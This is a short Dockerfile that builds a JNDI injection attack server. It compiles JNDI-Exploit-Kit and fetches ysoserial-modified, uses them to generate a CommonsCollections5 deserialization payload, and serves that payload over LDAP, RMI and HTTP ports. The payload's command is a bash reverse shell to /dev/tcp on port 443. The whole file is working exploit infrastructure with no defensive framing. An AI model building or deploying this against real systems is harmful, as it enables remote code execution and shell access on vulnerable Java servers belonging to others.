FROM maven as builder

RUN git clone https://github.com/pimps/JNDI-Exploit-Kit \
    && mkdir /usr/src/app \
    && cp -avr JNDI-Exploit-Kit/src /usr/src/app/src \
    && cp -av JNDI-Exploit-Kit/pom.xml /usr/src/app \
    ##### Compile JNDI-Exploit-Kit #####
    && mvn -f /usr/src/app/pom.xml clean package -DskipTests

FROM openjdk:8-alpine
RUN wget -q https://github.com/pimps/ysoserial-modified/raw/master/target/ysoserial-modified.jar \
    && java -jar ysoserial-modified.jar CommonsCollections5 bash '/bin/bash -i >& /dev/tcp/127.0.0.1/443 0>&1' > /tmp/run.ser
COPY --from=builder /usr/src/app/target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar /usr/app/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar

EXPOSE 1389 9090 1099

ENTRYPOINT ["java", "-cp", "/usr/app/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar", "-L", "127.0.0.1:1389", "-J", "127.0.0.1:9090", "-R", "127.0.0.1:1099", "-P", "/tmp/run.ser"]